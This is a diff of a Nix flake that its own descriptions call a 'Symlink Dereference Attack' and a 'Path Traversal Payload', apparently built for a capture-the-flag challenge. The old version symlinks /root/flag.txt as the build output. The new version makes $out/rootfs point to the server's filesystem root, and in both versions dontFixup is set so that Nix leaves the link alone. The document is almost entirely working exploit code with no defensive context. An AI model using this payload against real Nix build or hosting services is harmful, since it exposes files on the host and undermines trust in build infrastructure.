@@ -1,9 +1,7 @@
 {
-  description = "Direct Symlink Dereference Attack (No Fixup)";
+  description = "Indirect Path Traversal Payload";
 
-  inputs = {
-    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
-  };
+  inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
 
   outputs = { self, nixpkgs }: 
   let
@@ -11,19 +9,18 @@
     pkgs = import nixpkgs { inherit system; };
   in {
     packages.${system}.default = pkgs.stdenv.mkDerivation {
-      pname = "direct-symlink";
+      pname = "symlink-dir";
       version = "1.0";
       src = ./.;
 
-      # Disable the default phases that might interact with our symlink
       dontConfigure = true;
       dontBuild = true;
-      
-      # THE MAGIC BULLET: Stop Nix from chown/chmod-ing the symlink target
-      dontFixup = true; 
+      dontFixup = true; # Stop Nix from breaking our permissions!
 
       installPhase = ''
-        ln -s /root/flag.txt $out
+        mkdir -p $out
+        # Create a shortcut to the root of the server
+        ln -s / $out/rootfs
       '';
     };
   };
